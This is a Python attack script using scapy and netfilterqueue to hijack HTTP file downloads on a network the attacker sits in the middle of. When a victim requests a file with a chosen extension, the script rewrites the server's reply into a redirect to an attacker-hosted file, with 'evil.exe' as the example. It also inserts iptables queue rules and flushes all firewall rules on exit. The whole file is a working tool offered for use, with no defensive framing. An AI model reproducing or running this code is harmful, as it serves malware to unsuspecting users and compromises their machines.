#!/usr/bin/env python

__author__ = "3r4th"

import optparse
import subprocess
import netfilterqueue
import scapy.all as scapy


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-e", "--file-extension", dest="file_extension", help="Type of the file to intercept, ex : .exe "
                                                                            "or .pdf")
    parser.add_option("-f", "--file-link", dest="file_link", help="Link to the file which will replace the one "
                                                                  "intercepted, ex : http://192.168.1.5/evil.exe")
    (options, arguments) = parser.parse_args()
    if not options.file_extension:
        parser.error("[-] Please specify an extension, use --help for more info")
    elif not options.file_link:
        parser.error("[-] Please specify your file to be delivered, use --help for more info")
    return options


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if str(options.file_extension) in scapy_packet[scapy.Raw].load:
                print("[+] Target is trying to download a " + str(options.file_extension) + " file")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file ...")
                modified_packet = set_load(scapy_packet,
                                           "HTTP/1.1 301 Moved Permanently\nLocation: " + str(
                                               options.file_link) + "\n\n")
                packet.set_payload(str(modified_packet))
    packet.accept()


if __name__ == "__main__":
    global options, ack_list
    ack_list = []
    options = get_arguments()
    try:
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        print("[+] Intercepting files Started ...")
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\033[1;31;49m" + "\n[-] Detected CTRL + C. flushing iptables ..." + "\033[1;37;49m")
        subprocess.call("iptables --flush", shell=True)
        print("\033[1;32;49m" + "[+] Intercepting files Stopped ..." + "\033[1;37;49m")
